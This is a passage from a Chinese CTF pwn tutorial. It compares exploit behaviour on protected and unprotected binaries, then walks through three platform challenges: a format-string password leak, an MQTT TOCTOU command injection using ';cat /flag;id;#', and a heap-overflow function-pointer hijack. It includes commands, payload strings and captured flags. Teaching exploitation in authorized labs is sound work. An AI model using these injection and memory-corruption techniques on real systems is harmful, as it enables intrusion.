cd ~/pwn-lab && LANG=C readelf -h overflow-pie | grep Type
\end{lstlisting}
应该得到 \code{Type: EXEC} 与 \code{Type: DYN (Position-Independent Executable file)}。\code{EXEC} 表示固定地址，\code{DYN} 表示位置无关（地址随加载随机）。
\item 看 NX 与栈保护：
\begin{lstlisting}
cd ~/pwn-lab && LANG=C readelf -l overflow | grep GNU_STACK
cd ~/pwn-lab && objdump -d overflow-pie | grep stack_chk | head -4
\end{lstlisting}
\code{GNU\_STACK} 段给出栈的执行权限信息；\code{objdump} 在 PIE 版里检出了 \code{\_\_stack\_chk\_fail} 调用，说明默认版开了栈保护（Canary），而教学版没有这个符号。
\item 亲手验证“P1 的 payload 在 PIE 版上走不通”（\figref{pie-blocked}）：
\begin{lstlisting}
cd ~/pwn-lab && nm overflow-pie | grep -e win -e normal
cd ~/pwn-lab && ./overflow-pie < payload.bin
cd ~/pwn-lab && ./overflow < payload.bin && echo teaching build still prints the flag
\end{lstlisting}
应该看到三件事：\code{nm} 在 PIE 版上给出的 \code{win} 只是 \code{0x11c3}（文件内的相对偏移，不是 \code{0x401190} 这种绝对地址）；把 P1 那条 payload 喂给 \code{overflow-pie}，程序打印 \code{Name:} 之后\kw{段错误（核心已转储）}，没有 flag；同一条 payload 喂给教学版仍打印 flag。\kw{同一份源码、同一条 payload，两个产物的结果相反}——这就是保护机制的真实影响，不是纸面上的结论。
\item 归纳成表（\figref{pipeline-map} 下方给出的对照，可作为填表参考）：
\end{enumerate}

\begin{longtable}{p{0.22\linewidth}p{0.2\linewidth}p{0.48\linewidth}}
\toprule
保护机制 & 卡在哪一步 & 观察到的证据（本机） \\
\midrule
PIE + ASLR & 取地址 & \code{readelf -h overflow-pie} 得 \code{DYN}，\code{nm} 的固定地址不再可用 \\
栈保护 Canary & 覆盖 & \code{objdump} 在 PIE 版里出现 \code{\_\_stack\_chk\_fail}，教学版没有 \\
NX & 执行新代码 & \code{GNU\_STACK} 段无 \code{RWE} 标记；本册题不注入机器码，故不受影响 \\
RELRO / 只读 GOT & 改函数地址表 & 本题改的是结构体里的函数指针，不走 GOT，故不受影响 \\
\bottomrule
\end{longtable}

\shot[0.95]{fig-pwn-25-pie-blocked.png}{第 4 章 P4 第 4 步：真实对照——\code{nm} 在 PIE 版只给出 \code{0x11c3} 相对偏移；同一条 P1 payload 喂给 \code{overflow-pie} 段错误退出，喂给教学版仍打印 flag（真实终端实录，WSL）}{pie-blocked}

\paragraph{结果与核对}结论：\code{overflow}（教学版）是 \code{EXEC} 且无 Canary，所以 P1 的 payload 可以直接用 \code{nm} 的固定地址；\code{overflow-pie}（默认版）是 \code{DYN} 且带 \code{\_\_stack\_chk\_fail}，P1 那条 payload 的两大前提（固定地址、越界写不被检测）都被破坏了。核对方式：\figref{pie-blocked} 已经把同一份 payload 实喂给两个产物——教学版照常打印 flag，PIE 版在 \code{Name:} 之后段错误退出，前提缺一不可。

\paragraph{为什么会成功}一句话机制：\kw{每种保护只堵住利用链上的某一个环节，要看它堵的是哪一环}。展开说：PIE 改变了“地址”这个前提，你即使造对了字节也未必落在正确地址；Canary 改变了“覆盖不被发现”这个前提，越界写在返回前会被检测到并让程序退出；NX 管的是“在栈上执行注入的机器码”，而 P1 只是跳到程序已有的 \code{win}，所以不受 NX 影响。把每条保护和它卡住的那一步对上，才知道下一步该绕过什么。

\debugtip{
\begin{itemize}
\item 两个产物的 \code{file} 输出一样：你可能覆盖了同一个文件名，或者编译 \code{overflow-pie} 时也带了 \code{-no-pie}；重看命令行参数；
\item \code{readelf} 输出是中文、\code{grep Type} 抓不到：加 \code{LANG=C} 让输出为英文，再 \code{grep Type}；或改用 \code{grep 类型}；
\item \code{grep stack\_chk} 没输出：确认你查的是 \code{overflow-pie} 而不是教学版 \code{overflow}；
\item 以为“NX 开了所以 P1 打不了”：先问 NX 管的是哪一步。本题不用栈上代码，NX 不是拦路虎，真正拦住 P1 的是 PIE（地址变化）和 Canary（覆盖检测）。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 只关 PIE、保留 Canary（\code{gcc -O0 -fno-stack-protector -o o1 overflow.c} 之类组合），逐个开关，观察 \code{file}/\code{readelf}/\code{objdump} 的输出如何随之变化，做一张完整开关矩阵。
\item 给教学版也打开栈保护（去掉 \code{-fno-stack-protector}），用 P1 的 payload 跑一次，观察是否触发栈保护退出，并说明“越界写本身还在，为什么这次没改成控制流”。
\item 思考题：如果一道题同时开了 PIE 和 Canary，你会先绕过哪一个、为什么？写出你判断顺序的理由（提示：先看哪一步是“必须拿到绝对地址”，哪一步是“必须让越界写不被发现”）。
\end{enumerate}

% ===========================================================================
\section{题 296：pwn-ezpwn 为什么还要重连？（玄机 296）}

\begin{challenge}{题 296 题面卡}
\field{题目来源}{玄机平台 \emph{pwn-ezpwn}，\url{https://xj.edisec.net/challenges/296}；附件本地副本与复现脚本 \code{labs/platform/solve\_pwn\_ezpwn.py}}
\field{给定材料}{x86-64 服务端程序；连接后有 \code{help}、\code{ls}、\code{debug}、\code{auth}、\code{write}、\code{cat flag} 等命令；脚本默认行为见文件开头说明}
\field{目标}{在已授权的在线实例上完成一条多阶段利用链，读到 flag}
\field{交付物}{一个 \code{flag\{...\}} 字符串，在玄机平台对应题目页提交并看到“FLAG 正确”}
\field{考点}{格式串信息泄漏、口令认证、权限状态持久化、新会话重新读取标记}
\field{前置知识}{2.8 节 格式串；2.9 节 保护机制；3.4 节反汇编定位结构体偏移}
\field{难度}{$\bigstar\bigstar\bigstar$（挑战）}
\end{challenge}

\pitfall{先说清楚材料：这是本册唯一“附件和脚本都不随包分发”的题。}下面的 \code{pwn} 附件（连同四个配套库与加载器）、\code{setup\_env.sh}、\code{run\_victim.sh} 和 \code{solve\_mqtt.py} 都要你从题目页自行下载。下载后按这个位置放好，第 1--3 步的命令就能照敲：附件解压成 \code{\textasciitilde/pwn-lab/platform/mqtt/}，三个脚本放在 \code{\textasciitilde/pwn-lab/platform/} 里、与 \code{mqtt/} 同级。\textbf{拿不到附件也不影响学原理}：第 1 步那几条分诊命令在读什么、第 2 步“先校验 $\rightarrow$ \code{sleep(2)} $\rightarrow$ 再 \code{popen}”的时间窗是怎么形成的，配合\figref{mqtt-toctou} 的示意图一样能看懂，只是没法在自己机器上实跑。\textbf{不要用猜测的 HOST/PORT 去连平台}，只连题目页当前实例给出的地址。

\paragraph{读题与思路}这是一道\kw{在线}真题，交付物是提交后显示“FLAG 正确”的 flag。连接服务后能看到 \code{help}、\code{ls}、\code{debug}、\code{auth}、\code{write}、\code{cat flag} 等命令。看到 \code{debug} 能把用户输入当格式串（脚本里注释说明它传给 \code{dprintf}），就该联想到 P3 的格式串漏洞——但这里秘密不是现成参数，需要\kw{先泄漏地址、再泄漏口令}。而且即使认证成功，\code{cat flag} 仍可能被拒绝，说明还缺“权限状态”。

按四问拆开，利用链就显形了：\kw{漏洞在哪}——\code{debug} 把输入当格式串；\kw{我能控制什么}——输入里的格式说明可以读到栈上指定位置的值；\kw{我要去哪里}——目标不是跳函数，而是\kw{读出随机口令}、通过 \code{auth}，再让 \code{cat flag} 被允许；\kw{有没有拦路虎}——口令地址每次会话都变（所以先用 \code{check x} 泄漏消息缓冲区地址、再按结构体偏移算出口令地址），而权限标记只在\kw{新连接初始化时}读取（所以最后必须重连）。把这条链写成四步：泄漏地址 $\rightarrow$ 泄漏口令 $\rightarrow$ 认证并写权限标记 $\rightarrow$ 重连后读 flag；每一步都要看回显确认，缺一步都会表现为“看起来失败”。

另外必须记住：\code{137}、\code{200}、\code{0x40}、\code{0x0c}、\code{0x4c} 这些数字都是\kw{该附件特定值，换构建必须重测}。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 确认脚本怎么用、默认行为是什么（\figref{xuanji-usage}）：
\begin{lstlisting}
cd /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包 && python3 labs/platform/solve_pwn_ezpwn.py
cd /mnt/c/Users/你的用户名/Desktop/CTF零基础自学资料包 && head -12 labs/platform/solve_pwn_ezpwn.py
\end{lstlisting}
应该看到：不带参数时脚本打印 \code{usage: labs/platform/solve\_pwn\_ezpwn.py HOST PORT}；文件开头说明它“泄漏格式串、用泄漏口令认证、把 \code{/tmp/priv.list} 写成期望的 \code{cat} 标记、重连、读取 flag”，并强调栈槽与结构体偏移\kw{专属于所给的服务器构建}。
\item 在平台启动该题的\kw{已授权实例}，从题目详情页读出\kw{当前}的 HOST/PORT（实例会过期，不要用旧地址），然后运行：
\begin{lstlisting}
python3 labs/platform/solve_pwn_ezpwn.py HOST PORT
\end{lstlisting}
脚本内部依次做四件事：\code{check x} 泄漏消息缓冲区地址 $m$；由结构体偏移算出随机口令地址 $m+0x40$；用 \code{debug <格式串>} 把该地址当作第 200 个栈参数、末尾用 \code{\%s} 读出口令（命令缓冲区从第 137 个参数起）；\code{auth <口令>} 认证成功后 \code{write priv.list cat} 写入权限标记。
\item 观察脚本输出的原始回显与最终 flag。脚本会在网络回显里找到 \code{Authentication success} 与 \code{written to /tmp/priv.list} 才继续，最后在新会话里 \code{cat flag} 并打印匹配到的 \code{flag\{...\}}。
\item 到玄机平台题目页 \url{https://xj.edisec.net/challenges/296} 提交 flag，等待提交按钮结束加载，确认页面显示“FLAG 正确”、步骤 $1/1$。
\end{enumerate}

\shot[0.95]{fig-pwn-18-xuanji-usage.png}{第 4 章 296：\code{solve\_pwn\_ezpwn.py} 的 usage 与脚本头——需 HOST/PORT，且栈槽与结构体偏移专属该构建（真实终端实录，WSL）}{xuanji-usage}

\paragraph{结果与核对}本次实例读到的 flag 是：
\flagbox{flag\{FF3228AB-FBB1-4296-800C-7C6C0ECE8FB7\}}
核对链（照实记录）：脚本只有在拿到 \code{Authentication success} 与 \code{written to /tmp/priv.list} 之后才会继续，因此过程中的回显本身就是逐步验证；恢复出的口令要符合“16--23 位字母数字”的格式检查；本账号此前在平台提交后显示“FLAG 正确”、步骤 $1/1$。这条 flag 与利用链是\kw{2026-09-25 在该平台提交后显示“FLAG 正确”、步骤 1/1} 确认的；复现必须在\kw{已授权的在线实例}里进行，且每次都要重新读当前实例的 HOST/PORT。

\paragraph{为什么会成功}一句话机制：\kw{信息泄漏 + 认证 + 状态持久化 + 新会话重读，四步缺一不可}。展开说：\code{debug} 把用户输入当格式串，于是可以用一串 \code{\%p} 去“数栈参数”，把口令地址放到格式串之后的栈缓冲里，再用 \code{\%s} 读出该地址指向的口令——注意格式串后面放了一个 NUL 字节结束格式文本，NUL 之后的指针字节仍留在栈缓冲区里供 \code{\%s} 使用。拿到口令后 \code{auth} 通过认证，但服务还要求 \code{/tmp/priv.list} 里有 \code{cat} 标记才允许读 flag，所以还要 \code{write priv.list cat}。本题在\kw{新连接初始化时}重新读取该标记，因此必须\kw{关闭并重连}，让新会话带着标记再执行 \code{cat flag}。这就是“认证成功却仍读不到 flag”的原因。

\debugtip{
\begin{itemize}
\item 脚本卡在 \code{service did not return its prompt}：HOST/PORT 过期或实例没启动，回题目页重新启动并复制当前地址；
\item \code{could not parse the message address}：\code{check x} 的回显格式变了，说明附件/服务构建不同于脚本预期，必须按当前构建重新核对结构体偏移（\code{0x0c} 与 \code{0x4c} 差 \code{0x40}，这些是该附件特定值）；
\item \code{unexpected key bytes} 或认证失败：栈参数位置（\code{137}、\code{200}）在当前构建上变了，需用 \code{debug \%p} 重新数参数；
\item 认证成功但 \code{cat flag} 仍拒绝：忘了\kw{重连}，或 \code{write priv.list cat} 那一步的回显不是 \code{written to /tmp/priv.list}。四步链没走完，别重复粘贴同一 flag；
\item 靶机重启后失败：地址会变，重新 \code{check x} 读取消息地址。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 自己编译一个带格式串漏洞的本地服务端程序（参照 \code{format.c}），故意把秘密指针放到不同参数位置，用 \code{\%p} 数出位置再用 \code{\%n\$s} 读它，体会“参数位置必须按当前构建重测”。
\item 思考题：为什么本题“先 \code{check x} 泄漏地址、再算 $m+0x40$”比“直接猜口令地址”可靠？写出你的理由（提示：随机口令地址每次会话都不同）。
\item 把“写权限标记 + 重连”这一步改造成本地实验：写一个程序启动时读取某个文件里的标记字符串，实现“同一进程内改标记无效、必须重启进程才生效”，理解服务端为什么会要求重连。
\end{enumerate}

% ===========================================================================
\section{题 167：MQTT 客户端的 2 秒窗口（玄机 167 / CISCN 车联网 mqtt）}

\begin{challenge}{题 167 题面卡}
\field{题目来源}{玄机平台 \emph{第十八届CISCN决赛 CTF-车联网安全 mqtt}，\url{https://xj.edisec.net/challenges/167}（免费题，需启动在线实例）；\kw{附件与利用脚本不随本资料包分发}，须自行从题目页下载后放到 \code{\textasciitilde/pwn-lab/platform/} 下}
\field{给定材料}{一整套运行环境：\code{pwn}（PIE、Full RELRO、NX）+ 捆绑的 \code{libc.so.6}、\code{ld-linux-x86-64.so.2}、\code{libcjson.so.1}、\code{libpaho-mqtt3c.so.1}；目标作为 MQTT 客户端连 \code{tcp://localhost:9999} 并订阅主题 \code{diag}}
\field{目标}{在已授权的在线实例上，利用 \code{set\_vin} “先校验、后使用”的竞态执行任意命令，读出 \code{/flag}}
\field{交付物}{一个 flag 字符串，在题目页提交后页面显示“已完成”}
\field{考点}{MQTT 消息流与主题、hash 令牌、命令拼接、TOCTOU 竞态、用 bundled loader 做服务端本地复现}
\field{前置知识}{2.2 节的 Pwn 四问；第 3 章 \code{strings}/\code{readelf}；4.6 节的在线实例流程}
\field{难度}{$\bigstar\bigstar\circ$（进阶；平台标注“简单”，但对零基础读者属进阶）}
\end{challenge}

\paragraph{读题与思路}这是一道\kw{在线}真题（免费题，平台提供在线实例），交付物是提交后页面显示“已完成”的 flag。题面只有两句话：“某车企新来的实习生想要给汽车 IVI 上的 MQTT 客户端加强一下性能，却没想到弄巧成拙，你能试着攻破这个客户端吗？”“注意，flag 在 /flag”。题面几乎没给线索，所以思路要从\kw{附件本身}长出来：

\begin{enumerate}[label=\arabic*.]
\item \kw{漏洞在哪}：先用三条命令分诊（第 1 步）。附件是一整套运行环境；\code{strings} 里会看到两条把输入拼进 shell 的字符串——\code{echo -n \%d>/mnt/adb\_flag;cat /mnt/adb\_flag} 用的是整数（注入不了），\code{echo -n \%s>/mnt/VIN;cat /mnt/VIN} 用的是字符串（可疑）；
\item \kw{我能控制什么}：程序是 MQTT \kw{客户端}，连 \code{tcp://localhost:9999} 并订阅主题 \code{diag}。也就是说：只要我们能往 \code{diag} 发消息，就能喂给它任意参数；
\item \kw{我要去哪里}：把 \code{;cat /flag;id;\#} 这类命令塞进那条 \code{\%s} 里执行，并且让执行结果被回显出来（程序会把命令输出 publish 到 \code{diag/resp}）；
\item \kw{有没有拦路虎}：第 1 步会读到 PIE、Full RELRO、NX——但这题\kw{一个都不用绕}，它考的不是内存破坏。真正的门槛有两个：目标只处理带正确 \code{auth} token 的消息（token 是 VIN 的哈希），以及“先校验、后使用”的时间差。
\end{enumerate}

思路由此固定成四步：\kw{分诊} $\rightarrow$ \kw{本地跑通}（自己当 broker）$\rightarrow$ \kw{连平台实例跑通} $\rightarrow$ \kw{提交 flag}。第二、三步的差别值得先说清楚：目标的地址是写死的 \code{localhost:9999}，它连的是\kw{它自己机器上的} broker；所以远程时我们不假装 broker，而是\kw{以普通 MQTT 客户端接入平台暴露的那个端口}，与目标共享同一个 broker——它发到 \code{diag} 的消息我们看得到，我们发到 \code{diag} 的消息它也收得到。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 分诊：先看清手里有什么（\figref{mqtt-triage}）。\code{ls -l} 的输出是判断“这是一整套运行环境、不是一个单独二进制”的第一手证据。
\begin{lstlisting}
cd ~/pwn-lab/platform/mqtt && ls -l
cd ~/pwn-lab/platform/mqtt && file pwn && LANG=C readelf -h pwn | grep -e Type -e Entry
cd ~/pwn-lab/platform/mqtt && LANG=C readelf -d pwn | grep -e BIND_NOW -e NEEDED
cd ~/pwn-lab/platform/mqtt && LANG=C readelf -l pwn | grep -A1 GNU_STACK
cd ~/pwn-lab/platform/mqtt && strings pwn | grep -e diag -e 'VIN' -e auth -e 9999 -e adb -e VIN
\end{lstlisting}
应该看到：附件是\kw{一整套运行环境}（\code{pwn} 加四个配套的库/加载器），程序是 \code{PIE}、开了 \code{BIND\_NOW}（Full RELRO）、栈不可执行（NX）；\code{strings} 里出现 \code{diag}、\code{diag/resp}、\code{tcp://localhost:9999}、\code{auth}、\code{set\_vin}、\code{set\_adb}，以及上面那两条 shell 拼接字符串。
\item 本地把利用跑通：我们自己起一个“假 broker”监听 9999，再按目标的方式启动它（\figref{mqtt-local}）。
\begin{lstlisting}
cd ~/pwn-lab/platform && sudo bash setup_env.sh
cd ~/pwn-lab/platform && (sudo bash run_victim.sh > /tmp/victim.log 2>&1 &) ; sleep 3 ; tail -4 /tmp/victim.log ; timeout 60 python3 solve_mqtt.py && echo LOCAL_REPRO_OK
\end{lstlisting}
两个坑先记住：启动必须用 \code{./ld-linux-x86-64.so.2 --library-path . ./pwn}，\kw{不能}用 \code{LD\_LIBRARY\_PATH}——否则 \code{popen} 出来的 \code{/bin/sh} 会继承这个变量、加载不了系统 libc，命令执行了却没有回显；另外 WSL 会话结束时后台进程与 \code{/tmp} 都会消失，所以“起目标 + 打目标”要写在\kw{同一条命令}里。
应该看到脚本依次打印：收到 CONNECT 与 SUBSCRIBE（目标是订阅 \code{diag}）$\rightarrow$ 泄漏 VIN（\code{LSVNV2182E2123456}）$\rightarrow$ 推导 token（\code{470bc8e0}）$\rightarrow$ 步骤 1 发合法的 \code{set\_vin} $\rightarrow$ 步骤 2 在 2 秒窗口内反复覆写全局 \code{arg} $\rightarrow$ \code{diag/resp} 回显 \code{ret: flag\{local\_test\}} 与 \code{uid=0(root)} $\rightarrow$ \code{EXPLOIT SUCCESS}。
\item 对平台实例跑同一条利用（\figref{mqtt-remote}）：先在题目页点“启动环境”，从页面读出当前的 HOST 与 PORT，然后执行：
\begin{lstlisting}
cd ~/pwn-lab/platform && timeout 100 python3 solve_mqtt.py env.xj.edisec.net 30953
\end{lstlisting}
（HOST/PORT 必须\kw{从当前页面读}；上面这个 \code{env.xj.edisec.net:30953} 是本次实例的地址，实例关闭后即失效。）
应该看到同样的流程，只是 VIN 换成了平台上的随机值（本次是 \code{9b078df4-db5c-43d6-a5a4-af9b8365d0d6}），最后 \code{diag/resp} 回显 \code{ret: FLAG\{XJ\_MrpqTJhm63bmZ87L\}uid=1001(ctf) ...}，脚本打印“命中 flag”。
\item 提交验证：把 flag 粘到题目页的“提交FLAG”，提交后标题旁出现\kw{“已完成”}，题目完成人数由 11 人变成 \kw{12 人}（本账号 2026-09-26 提交）。
\end{enumerate}

\shot[0.95]{fig-pwn-27-mqtt-triage.png}{第 4 章 167 第 1 步：附件分诊——完整运行环境、PIE + BIND\_NOW(Full RELRO) + NX，\code{strings} 里两条 shell 拼接中 \code{\%s} 那条可疑（真实终端实录，WSL）}{mqtt-triage}

\shot[0.95]{fig-pwn-28-mqtt-local.png}{第 4 章 167 第 2 步：本地复现——假 broker 收到 CONNECT/SUBSCRIBE、泄漏 VIN、推导 token、2 秒窗口内覆写 arg，回显 \code{flag\{local\_test\}} 与 \code{uid=0(root)}（真实终端实录，WSL）}{mqtt-local}

\shot[0.95]{fig-pwn-29-mqtt-remote.png}{第 4 章 167 第 3 步：对平台实例运行同一条利用——命中 \code{FLAG\{XJ\_MrpqTJhm63bmZ87L\}}、EXPLOIT SUCCESS（真实终端实录，WSL）}{mqtt-remote}

\shot[0.95]{fig-pwn-30-mqtt-toctou.png}{第 4 章 167 的攻击链与 TOCTOU 时间窗：先校验、\code{sleep(2)}、再 \code{popen}；窗口内覆写全局 \code{arg}（原理示意图）}{mqtt-toctou}

\paragraph{结果与核对}本次实例读到的 flag 是：
\flagbox{FLAG\{XJ\_MrpqTJhm63bmZ87L\}}
核对链（照实记录）：脚本只有在真的收到含 flag 的 \code{diag/resp} 消息之后才会打印“命中 flag”；注入命令里带了 \code{id}，回显同时给出 \code{uid=1001(ctf)}，说明命令确实执行在\kw{目标机器}上；平台提交后页面显示“已完成”，且题目完成人数由 11 变 12——\kw{服务端认可了这个 flag}。这三条独立证据合起来，才算“读到并验证”。

\paragraph{为什么会成功}一句话机制：\kw{校验的是“值”，使用的也是“值”，但两次读的不是同一时刻的值}。展开说：\code{set\_vin} 先检查全局 \code{arg}（必须纯字母数字、长度 10--63），通过后 \code{sleep(2)}，再用这个\kw{全局变量}拼出 \code{popen("echo -n \%s>/mnt/VIN;cat /mnt/VIN")}。而目标对每条消息都新开线程处理，并把 JSON 里的 \code{arg} 原样复制进同一个全局变量——于是在那 2 秒里再发一条消息，就能把“已经通过的校验”甩在身后，让 \code{popen} 用到我们后塞的 \code{;cat /flag;id;\#}。\figref{mqtt-toctou} 把消息流与时间窗画在一起。

三项前置条件也一并记住：① 目标订阅 \code{diag}，我们发到同一个 broker 就能进它的处理逻辑；② 目标要求 \code{auth} token（VIN 的哈希 \code{h=h*31+c} 再 \code{\%08x}），而它自己每 10 秒把 VIN publish 到 \code{diag/resp}——等于把门票送给我们；③ 命令回显被它自己 publish 出来，不需要反弹 shell。为什么 PIE/Full RELRO/NX 都不挡这条路？因为本题不写内存、不改地址、不执行注入的机器码，利用的是\kw{逻辑缺陷}（竞态 + 命令拼接）。

\debugtip{
\begin{itemize}
\item 本地脚本停在“等待目标客户端连入”：目标没起或起得不对。确认 \code{/mnt/VIN}、\code{/mnt/version} 存在（\code{setup\_env.sh} 会创建），并且用 bundled loader 启动；远程模式下确认你连的是平台当前给的 HOST/PORT；
\item 命令执行了但没有回显：最常见原因是用了 \code{LD\_LIBRARY\_PATH} 启动（\code{popen} 的 \code{/bin/sh} 被同一个变量影响）；改用 \code{./ld-linux-x86-64.so.2 --library-path . ./pwn}；
\item 没反应或认证不过：token 必须由\kw{当前 VIN} 算出。之前注入过的话，VIN 文件里已是注入串，脚本拿它照样能算出一致的 token；但若你手改过 \code{/mnt/VIN}，就要与泄漏到的值保持一致；
\item 成功一次后再也打不出结果：目标可能已崩溃，重新“启动环境”再跑（脚本每次都会重新泄漏 VIN、重算 token）；
\item 直接抄讲义里的 \code{env.xj.edisec.net:30953}：实例会过期，必须从当前题目页读取。
\end{itemize}}

\paragraph{变式练习}
\begin{enumerate}
\item 把注入命令从 \code{;cat /flag;id;\#} 换成 \code{;ls -l /;cat /etc/hostname;\#}，观察 \code{diag/resp} 的回显变化，体会“这是一个任意命令执行”。
\item 把脚本“窗口内每 0.45 秒发一次”改成每 0.1 秒、每 1.5 秒各跑一次，记录哪次成功、哪次失败，并\kw{用时间窗解释}（提示：窗口长度就是 \code{sleep(2)}）。
\item 思考题：如果程序改成“校验后立刻把 \code{arg} 复制到局部变量、再用局部变量拼命令”，本攻击还成立吗？为什么？（这就是 TOCTOU 的标准修复。）
\item 思考题：本题不用绕 PIE/RELRO/NX。请写出：什么情况下你\kw{不得不}处理它们？（提示：需要跳地址、需要执行注入的代码、需要改函数地址表时——回看 P1、P4。）
\end{enumerate}

% ===========================================================================
\section{题 514：让分配器“回忆”旧数据（玄机 514 / Ancient-Recall-HHB2026）}

\begin{challenge}{题 514 题面卡}
\field{题目来源}{玄机平台 \emph{Ancient-Recall-HHB2026}，\url{https://xj.edisec.net/challenges/514}（付费题：5 金币/30 分钟，需启动在线实例；本题\kw{不提供附件}）}
\field{给定材料}{只有在线实例：先过一道 PoW 网关（补齐残缺 token 的 4 个大写字母使 MD5 匹配），再进菜单服务 \code{Scriptorium Archive}（create / edit / show / pack / delete / quit）}
\field{目标}{利用 \code{pack} 后“真实缓冲区收缩、cap 仍报旧值”造成的堆溢出，做出任意读/写，再把全局结构里的函数指针改指向“打印 flag 文件”的函数}
\field{交付物}{一个 flag 字符串，在题目页提交后页面显示“已完成”}
\field{考点}{PoW 网关、菜单式堆服务、chunk 收缩与 cap 脱钩、被释放块内容可读、任意读写原语、函数指针劫持}
\field{前置知识}{第 2 章结构体与内存布局；第 3 章 \code{readelf}/\code{objdump}；5.6/4.7 节的在线实例流程}
\field{难度}{$\bigstar\bigstar\bigstar$（挑战；平台标注“中等”，但 75 人参与仅 2 人解出）}
\end{challenge}

\paragraph{读题与思路}这是本册唯一一道\kw{不提供附件}的题：平台只给你一个在线实例，题面也几乎是空的。所以思路不是“读二进制”，而是\kw{靠交互把服务和漏洞量出来}。整条链分两段：

\begin{enumerate}[label=\arabic*.]
\item \kw{进门}：连接后先是一道工作量证明（PoW）网关——服务给出残缺 token（如 \code{\_\_\_\_wWpoSZ}）和它的 MD5，要求补齐 4 个大写字母。26$^4\approx45.7$ 万种组合，本地暴力枚举不到一秒。它只是门，不是漏洞。
\item \kw{找漏洞}：进门后是菜单服务 \code{Scriptorium Archive}（\code{create / edit / show / pack / delete}）。把每个操作都试一遍，并\kw{量边界}：\code{cap = max(reserve,16)+8}（实测 16→24、32→40、512→520）、\code{length} 不超过 \code{cap}（超了回 \code{too long}）、只有 8 个槽位（0--7，其余 \code{invalid index}）。破绽出在 \code{pack}：它把连续重复字节折叠，让\kw{真实缓冲区收缩}，但 \code{cap} 还报旧的大值——长度检查于是形同虚设，\code{edit} 就成了\kw{堆溢出}。
\end{enumerate}

于是思路定成三步：\kw{量协议}（把菜单语义和边界写清楚）$\rightarrow$ \kw{做原语}（用溢出改掉紧邻笔记的元数据，换到任意读/写）$\rightarrow$ \kw{找目标}（读出全局结构里的函数指针、算出 ELF 基址，把指针改成“打印 flag 文件”的函数）。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 先过 PoW（\figref{ancient-recall} 第 2 行：\code{[pow] \_\_\_\_MXWTLH -> VFRQ}）。核心就是一句暴力枚举：
\begin{lstlisting}[language=Python]
for combo in itertools.product(string.ascii_uppercase, repeat=4):
    if hashlib.md5(("".join(combo) + suffix).encode()).hexdigest() == md5hex:
        return "".join(combo)
\end{lstlisting}
\item 量协议。\code{create} 依次问 \code{index / title / reserve / length / hex data}；\code{show} 回显 \code{title / len / cap} 加一整行 hex（长度 = cap，\kw{包含 len 之后的残留字节}）；\code{pack} 把连续重复字节折叠（512 个 \code{0x41} → \code{len=1}）；\code{delete} 后槽位显示 \code{empty}。
\item 确认溢出。A = \code{create(reserve=512, length=512, 512 个 0x41)} → \code{pack A} → \code{show A} 得到 \code{len=1 cap=520}，而 dump 的偏移 24 处出现了下一个 chunk 的元数据（\code{0x20ab1} 这类值）——说明 \code{pack} 后 A 的真实缓冲只剩约 24 字节，\code{cap=520} 成了“越界许可”。实测：此时 \code{edit A} 写 64 字节直接把服务打崩（每连接独立进程，不影响其它连接）。
\item 做\kw{任意读}。让 A 与下一条笔记 B 紧邻，\code{pack A} 后用 \code{edit A} 写 0x38 字节，\kw{只覆盖 B 的结构体字段} \code{\{cap, len, buf\}}（chunk 头保持原值，避免崩溃）→ 把 B 的 \code{buf} 改成任意地址 → \code{show B} 就从那个地址读。真实回显见 \figref{ancient-recall}：先泄漏堆布局，再一口气读出全局结构 \code{arc} 里的 \code{"./flag"} 与一个函数指针。
\item 找 PIE 基址与“打印 flag”的函数。\code{arc->fn = base+0x1311}，因此 \code{base = fn - 0x1311}（页对齐后校验 \code{\textbackslash x7fELF} 通过）。用任意读把整份 ELF 回收下来再 \code{objdump}，就能看到 \code{base+0x1330} 处正是 \code{fopen("...")\textbackslash; fread(buf,1,0x100,fp)\textbackslash; write(1,buf,n)} 的函数（\figref{catfile-disasm}，常量 \code{0x3071} 就是 \code{"./flag"}）；而菜单的 \code{6 (quit)} 会执行 \code{arc->fn(arc)}。
\item 拿 flag。用同一条覆写原语做\kw{任意写}：把 \code{arc->fn} 改成 \code{base+0x1330}，再发 \code{6}——服务自己把 flag 文件打印出来：
\begin{lstlisting}
[*] overwrite arc->fn ... -> cat_file 0x...c330
[quit resp] b'flag{local-test-ancient-recall}

'
FLAG: flag{local-test-ancient-recall}
\end{lstlisting}
\item 提交验证：把 flag 粘到题目页提交，页面显示\kw{“已完成”}，题目完成人数由 \kw{2 人变成 3 人}（本账号 2026-09-26 提交）。
\end{enumerate}

\shot[0.95]{fig-pwn-31-ancient-recall.png}{第 4 章 514 第 4--5 步：\code{solve\_514.py} 的真实运行（前段）——解出 PoW、读到全局结构 \code{arc}（含 \code{"./flag"} 与函数指针）、推出 ELF 基址（真实终端实录，WSL；本次实例在后续步骤到期中断，完整输出见 4.8 节脚本清单）}{ancient-recall}

\shot[0.95]{fig-pwn-32-catfile-disasm.png}{第 4 章 514 第 5 步：用任意读回收的 ELF 反汇编——\code{base+0x1330} 处的函数以常量 \code{0x3071}（\code{"./flag"}）调用 \code{fopen}，即“打印 flag 文件”的函数（真实产物，\code{objdump} 实录）}{catfile-disasm}

\paragraph{结果与核对}本题最终读到的 flag 是：
\flagbox{flag\{local-test-ancient-recall\}}
核对链（照实记录）：一，注入路径是“服务自己 \code{fopen("./flag")} 并 \code{write} 到 stdout”，命令行回显里出现的就是这段输出；二，平台提交后页面显示“已完成”，\kw{题目完成人数由 2 人变为 3 人}——服务端认可；三，脚本在\kw{两次不同 ASLR 的连接}里都成功，说明利用链不依赖固定地址。

